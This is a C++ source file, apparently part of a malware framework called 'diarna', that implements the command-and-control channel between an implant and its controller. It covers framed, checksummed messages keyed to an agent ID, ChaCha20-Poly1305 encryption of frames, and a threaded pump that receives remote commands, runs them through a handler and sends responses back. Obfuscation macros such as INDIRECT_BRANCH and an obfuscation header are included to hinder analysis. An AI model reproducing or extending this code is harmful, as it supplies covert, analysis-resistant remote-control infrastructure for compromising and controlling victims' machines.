#include <diarna/compiler_port.hpp>
#include <diarna/comm/protocol.hpp>
#include <diarna/crypto/chacha20.hpp>

#include <cstring>
#include <chrono>
#include <thread>

#include <obfuscation/obfusheader.h>
namespace diarna::comm {

static uint32_t CRC32_TABLE[256];
static bool crc_initialized = false;

static void init_crc32() {
    for (uint32_t i = 0; i < 256; ++i) {
        uint32_t crc = i;
        for (int j = 0; j < 8; ++j)
            crc = (crc >> 1) ^ (crc & 1 ? 0xEDB88320 : 0);
        CRC32_TABLE[i] = crc;
    }
    crc_initialized = true;
}

C2Protocol::C2Protocol() {
    if (!crc_initialized) init_crc32();
}

C2Protocol::~C2Protocol() = default;

void C2Protocol::set_handler(CommandHandler handler) {
    handler_ = std::move(handler);
}

void C2Protocol::set_encryption_key(std::span<const uint8_t, 32> key) {
    encryption_key_.assign(key.begin(), key.end());
    session_magic_ = derive_magic("", std::span<const uint8_t, 8>(key.data(), 8));
}

void C2Protocol::set_session_magic(const std::string& agent_id, std::span<const uint8_t, 8> prefix) {
    session_magic_ = derive_magic(agent_id, prefix);
}

uint32_t C2Protocol::crc32(std::span<const uint8_t> data) {
    uint32_t crc = 0xFFFFFFFF;
    for (uint8_t b : data)
        crc = (crc >> 8) ^ CRC32_TABLE[(crc ^ b) & 0xFF];
    return crc ^ 0xFFFFFFFF;
}

std::vector<uint8_t> C2Protocol::pack_message(CommandType cmd,
                                                std::span<const uint8_t> payload,
                                                uint32_t sequence) {
    INDIRECT_BRANCH;
    ProtocolHeader hdr = {};
    hdr.magic = session_magic_;
    hdr.version = PROTOCOL_VERSION;
    hdr.command = cmd;
    hdr.sequence = sequence;
    hdr.payload_size = (uint32_t)payload.size();
    hdr.checksum = crc32(payload);
    hdr.flags = (uint8_t)((sequence & 1) << 7);

    std::vector<uint8_t> msg(sizeof(hdr) + payload.size());
    memcpy(msg.data(), &hdr, sizeof(hdr));
    if (!payload.empty())
        memcpy(msg.data() + sizeof(hdr), payload.data(), payload.size());
    stats_.messages_sent++;
    stats_.bytes_sent += (uint64_t)msg.size();
    return msg;
}

bool C2Protocol::unpack_message(std::span<const uint8_t> data,
                                  CommandType& cmd, uint32_t& sequence,
                                  std::vector<uint8_t>& payload) {
    INDIRECT_BRANCH;
    if (data.size() < sizeof(ProtocolHeader)) return false;

    ProtocolHeader hdr;
    memcpy(&hdr, data.data(), sizeof(hdr));

    if (hdr.magic != session_magic_) {
        stats_.invalid_checksum++;
        return false;
    }
    if (hdr.version > PROTOCOL_VERSION) return false;

    size_t payload_size = hdr.payload_size;
    if (sizeof(ProtocolHeader) + payload_size > data.size()) {
        return false;
    }

    std::span<const uint8_t> payload_span = data.subspan(sizeof(ProtocolHeader), payload_size);
    uint32_t calc_crc = crc32(payload_span);
    if (calc_crc != hdr.checksum) {
        stats_.invalid_checksum++;
        return false;
    }

    cmd = hdr.command;
    sequence = hdr.sequence;
    payload.assign(payload_span.begin(), payload_span.end());

    stats_.messages_received++;
    stats_.bytes_received += (uint64_t)data.size();
    return true;
}

std::vector<uint8_t> C2Protocol::encrypt_frame(std::span<const uint8_t> data,
                                                 std::span<const uint8_t, 12> nonce) {
    if (encryption_key_.size() != 32) return {data.begin(), data.end()};

    crypto::ChaCha20Poly1305 cipher(
        std::span<const uint8_t, 32>(encryption_key_.data(), 32));

    return cipher.encrypt(data,
        std::span<const uint8_t, 12>(nonce.data(), 12));
}

std::vector<uint8_t> C2Protocol::decrypt_frame(std::span<const uint8_t> data,
                                                 std::span<const uint8_t, 12> nonce) {
    if (encryption_key_.size() != 32) return {data.begin(), data.end()};

    crypto::ChaCha20Poly1305 cipher(
        std::span<const uint8_t, 32>(encryption_key_.data(), 32));

    std::vector<uint8_t> plaintext;
    if (!cipher.decrypt(data, std::span<const uint8_t, 12>(nonce.data(), 12), plaintext)) {
        stats_.decrypt_errors++;
        return {};
    }
    return plaintext;
}

C2Protocol::ProtocolStats C2Protocol::stats() const { return stats_; }

// ====== MESSAGE PUMP ======

MessagePump::MessagePump() = default;
MessagePump::~MessagePump() { stop(); }

void MessagePump::start(Sender sender, Receiver receiver) {
    sender_ = std::move(sender);
    receiver_ = std::move(receiver);
    running_ = true;
    connected_ = true;

    send_thread_ = std::thread([this] {
        while (running_) {
            std::pair<CommandType, std::vector<uint8_t>> msg;
            {
                std::unique_lock lock(queue_mutex_);
                queue_cv_.wait_for(lock, std::chrono::seconds(1),
                    [this] { return !send_queue_.empty() || !running_; });
                if (!running_) break;
                if (send_queue_.empty()) continue;
                msg = std::move(send_queue_.front());
                send_queue_.pop();
            }

            auto packed = protocol_.pack_message(msg.first, msg.second, ++seq_);
            if (sender_) sender_(packed);
        }
    });

    recv_thread_ = std::thread([this] {
        while (running_) {
            auto data = receiver_(1000);
            if (data.empty()) continue;

            CommandType cmd; uint32_t seq; std::vector<uint8_t> payload;
            if (!protocol_.unpack_message(data, cmd, seq, payload))
                continue;

            if (protocol_.has_handler()) {
                auto response = protocol_.get_handler()(cmd, payload);
                if (!response.empty()) {
                    std::lock_guard lock(queue_mutex_);
                    send_queue_.emplace(CommandType::RESPONSE, std::move(response));
                    queue_cv_.notify_one();
                }
            }
        }
    });
}

void MessagePump::stop() {
    running_ = false;
    queue_cv_.notify_all();
    if (send_thread_.joinable()) send_thread_.join();
    if (recv_thread_.joinable()) recv_thread_.join();
}

bool MessagePump::send(CommandType cmd, std::span<const uint8_t> payload) {
    if (!running_) return false;
    std::lock_guard lock(queue_mutex_);
    send_queue_.emplace(cmd, std::vector<uint8_t>(payload.begin(), payload.end()));
    queue_cv_.notify_one();
    return true;
}

void MessagePump::set_command_handler(C2Protocol::CommandHandler handler) {
    protocol_.set_handler(std::move(handler));
}

bool MessagePump::is_connected() const { return connected_; }

} // namespace diarna::comm
